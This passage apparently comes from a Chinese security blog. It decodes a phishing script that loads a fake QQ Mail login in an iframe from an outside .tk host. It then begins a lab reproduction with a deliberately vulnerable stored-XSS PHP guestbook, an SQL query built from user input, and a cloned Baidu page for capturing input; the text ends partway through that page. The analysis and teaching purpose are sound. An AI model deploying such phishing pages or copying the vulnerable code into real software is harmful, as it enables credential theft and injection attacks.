url;</div><div class="line">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</div><div class="line">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</div><div class="line">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></div><div class="line">				k1='" <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</div><div class="line"> 				var  d =  window.frames[0];</div><div class="line">  				d.document.write(c b a j1 k1);   </div><div class="line">                &#125;  </div><div class="line">                else  </div><div class="line">                &#123;  </div><div class="line">                &#125;  </div><div class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>"));</div><div class="line">//--&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"));</div><div class="line">//--&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p>
<p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p>
<p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="xml">   </span></div><div class="line">               var pos,str,para,url;  </div><div class="line">                str = window.location.href;  </div><div class="line">                pos = str.indexOf("?")  ;</div><div class="line">                url = str.substring(pos 1);  </div><div class="line">                if (pos&gt;0)&#123;  </div><div class="line">				n='http://ujhgdgjalkfja2.tk/';</div><div class="line">				j1=n url;</div><div class="line">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</div><div class="line">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</div><div class="line">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></div><div class="line">				k1='" <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</div><div class="line"> 				var  d =  window.frames[0];</div><div class="line">  				d.document.write(c b a j1 k1);   </div><div class="line">                &#125;  </div><div class="line">                else  </div><div class="line">                &#123;  </div><div class="line">                &#125;  </div><div class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>其中</p>
<ul>
<li>str=window.location.href是获取当前url赋值给str</li>
<li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li>
<li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li>
</ul>
<p>前面我们已经知道windows.location.href是<a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="external">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p>
<p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p>
<p>然后整个页面的结果就是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></div><div class="line">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb"</span> <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb" target="_blank" rel="external">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p>
<p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing05.png" alt=""></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing06.png" alt=""></p>
<p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p>
<p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p>
<p>百科中是这样说的：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing07.png" alt=""></p>
<p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p>
<p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing08.png" alt=""></p>
<h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p>
<p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p>
<h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p>
<p>其中message.php负责输入留言和展示留言，代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:500px;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"text-align:left;"</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">昵&amp;nbsp&amp;nbsp称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">留&amp;nbsp&amp;nbsp言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"message"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">&lt;?php</div><div class="line">$con=mysqli_connect("localhost","root","123456","test");</div><div class="line">if(!$con)&#123;</div><div class="line"> die("database connect error!");</div><div class="line">&#125;</div><div class="line"></div><div class="line">$result=mysqli_query($con,"select `name`, `message` from mess;");</div><div class="line"></div><div class="line">while($row = $result-&gt;fetch_assoc()) &#123;</div><div class="line">        echo "&lt;hr&gt;&lt;br&gt;Name: " . urldecode($row["name"]). "&lt;br&gt;  Message: " . urldecode($row["message"]). "&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;";</div><div class="line">&#125; </div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$name = urlencode($_REQUEST['name']);</div><div class="line">$message = urlencode($_REQUEST['message']);</div><div class="line">echo '&lt;br&gt;';</div><div class="line"></div><div class="line">$con=mysqli_connect("localhost","root","123456","test");</div><div class="line">if(!$con)&#123;</div><div class="line"> die("database connect error!");</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if($name&amp;&amp;$message)</div><div class="line">&#123;</div><div class="line">	</div><div class="line">	mysqli_query($con,"INSERT INTO `mess` (`name`, `message`) VALUES ('".$name."', '".$message."');");</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo '&lt;script language="javascript"&gt;';</div><div class="line">echo "location.href='./message.php'";</div><div class="line">echo '&lt;/script&gt;';</div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>然后我们发现输入正常留言可以显示出来：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing09.png" alt=""></p>
<p>构造一个xss代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>也可以正常运行，证明存在存储型xss：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing10.png" alt=""></p>
<h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p>
<p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></div><div class="line"> 	.dd&#123;</div><div class="line"> 	color: gray;</div><div class="line"> 	font-family: "微软雅黑";</div><div class="line"> 	&#125;</div><div class="line"> 	.dd a&#123;</div><div class="line"> 	color: gray;</div><div class="line"> 	font-family: "微软雅黑";</div><div class="line"> 	&#125;</div><div class="line"> 	.aa a&#123;</div><div class="line"> 	color: #000000;</div><div class="line"> 	font-family: "微软雅黑";</div><div class="line"> 	font-size: 15px;</div><div class="line"> 	&#125;</div><div class="line"> 	body&#123;</div><div class="line"> 	margin: 0;</div><div class="line"> 	padding: 0;</div><div class="line"> 	&#125;</div><div class="line"> 	font:hover&#123;</div><div class="line"> 	cursor: pointer;</div><div class="line"> 	color: red;</div><div class="line"> 	&#125;</div><div class="line"> 	.back-img&#123;</div><div class="line"> 	border: 1px solid #000000;</div><div class="line"> 	position: absolute;</div><div class="line"> 	width: 100%;</div><div class="line"> 	height: 100%;</div><div class="line"> 	top: 0px;</div><div class="line"> 	left: 0px;</div><div class="line"> 	background-color: #000000;</div><div class="line"> 	opacity: 0.3;</div><div class="line"> 	z-index: 100;</div><div class="line"> 	display: none;</div><div class="line"> 	&#125;</div><div class="line"> 	.login&#123;</div><div class="line"> 	border: 1px solid #000000;</div><div class="line"> 	width: 390px;</div><div class="line"> 	height: 500px;</div><div class="line"> 	position: absolute;</div><div class="line"> 	top:26%;</div><div class="line"> 	left: 35%;</div><div class="line"> 	background-color:white;</div><div class="line"> 	z-index: 110;</div><div class="line"> 	display: none;</div><div class="line"> 	&#125;</div><div class="line"> 	.login-top&#123;</div><div class="line"> 	position: absolute;</div><div class="line"> 	width: 100%;</div><div class="line"> 	height: 10%;</div><div class="line"> 	background-color:white;</div><div class="line"> 	&#125;</div><div class="line"> 	.close-login&#123;</div><div class="line"> 	display: block;</div><div class="line"> 	position: absolute;</div><div class="line"> 	right: 10px;</div><div class="line"> 	top: 5px;</div><div class="line"> 	width: 30px;</div><div class="line"> 	height: 30px;</div><div class="line"> 	text-align: center;</div><div class="line"> 	line-height: 30px;</div><div class="line"> 	font-size: 30px;</div><div class="line"> 	color: gray;</div><div class="line"> 	&#125;</div><div class="line"> 	.close-login:hover&#123;</div><div class="line"> 	border: 1px solid gray;</div><div class="line"> 	cursor: pointer;</div><div class="line"> 	&#125;</div><div class="line"> 	.login-top:hover&#123;</div><div class="line"> 	cursor: move;</div><div class="line"> 	&#125;</div><div class="line"> 	 </div><div class="line"> 	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"800px"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"10%"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"aa"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>学术<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">font</span> <span class="attr">class</span>=<span class="string">"tt"</span> <span class="attr">onclick</span>=<span class="string">"login()"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>设置&amp;nbsp;&amp;nbsp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&amp;nbsp;&amp;nbsp;</div><div class="line"> 	<span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40%"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/baidu001.gif"</span> <span class="attr">width</span>=<span class="string">"270px"</span> <span class="attr">height</span>=<span class="string">"129px"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>	</div><div class="line"> 	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"baidu.php"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">style</span>=<span class="string">"width: 540px;height: 36px;font-size: 20px;"</span>/&gt;</span></div><div class="line"> 	<span class="comment">&lt;!-- &lt;img src="image/camera#.png" /&gt; --&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;"</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>手机百度<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>把百度设为主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>百度推广<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span 